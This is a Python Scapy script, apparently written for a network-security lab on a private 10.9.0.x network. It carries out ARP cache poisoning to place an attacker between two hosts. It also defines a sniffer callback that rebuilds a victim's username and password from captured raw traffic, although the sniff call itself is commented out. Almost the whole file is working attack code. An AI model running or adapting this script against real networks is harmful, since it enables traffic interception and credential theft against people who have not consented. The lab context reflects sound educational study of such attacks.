from scapy.all import *
import socket

hostA_IP = '10.9.0.5'
hostB_IP = '10.9.0.6'
attacker_IP = '10.9.0.7'
hostA_MAC = '02:42:0a:09:00:05'
hostB_MAC = '02:42:0a:09:00:06'
attacker_MAC = '02:42:96:d0:19:a5'
interface = 'br-3f634426b26d'

username = []
return_cnt = 0
password = []

def spoof(spoof_ip, target_ip):
    spoofed_pckt = Ether()/IP(src=spoof_ip, dst=target_ip)/ICMP()
    sendp(spoofed_pckt, iface= interface)
    
def poison_arp(spoof_ip, spoof_mac, target_ip, target_mac):
    # spoof an ARP reply to poison the ARP table
    arp_reply = Ether()/ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac, hwsrc=spoof_mac)
    sendp(arp_reply, iface=interface)
    print(f'arp reply summar: {arp_reply.summary()}')

    print('ARP reply sent - poisoning complete')

def mitm():
    # spoof an ICMP ping to Host A with Host B's IP address
    spoof(hostA_IP, hostB_IP)
    poison_arp(hostA_IP, attacker_MAC, hostB_IP, hostB_MAC)
    poison_arp(hostA_IP, attacker_MAC, hostB_IP, hostB_MAC)


    #spoof(hostB_IP, hostA_IP)
    # map Host A's IP Address to the attacker MAC in Host B's ARP table
    # map Host B's IP Address to the attacker MAC in Host A's ARP table
    #poison_arp(hostB_IP, attacker_MAC, hostA_IP, hostA_MAC)


def is_raw_frame(pckt):
    return pckt.haslayer(Raw) and pckt.haslayer(IP) and (pckt[IP].dst == '10.9.0.6')

def print_user_pass():
    u = "".join(username)
    p = "".join(password)
    print(f'Username: {u}')
    print(f'Password: {p}')

def print_pckt(pckt):
    global username, password, return_cnt
    if pckt.haslayer(Raw):
        byte_data = pckt[Raw].load
        if byte_data == b'\r\x00':
            return_cnt += 1
        elif not byte_data.startswith(b'\xff'):
            try:
                text = byte_data.decode('utf-8', errors='ignore')
                if text.strip():
                    print(text)
                    if return_cnt == 0:
                        username.append(text)
                    else:
                        password.append(text)
            except:
                print(f'Data: {byte_data}')
        if return_cnt == 2:
            print_user_pass()

if __name__ == "__main__":
    # spoof an ICMP ping to Host A
    spoof(attacker_IP, hostA_IP)
    # spoof an ARP reply in Host A's ARP table
    poison_arp(attacker_IP, attacker_MAC, hostA_IP, hostA_MAC)
    mitm()
    #sniff(iface=interface, lfilter=is_raw_frame, prn=print_pckt)
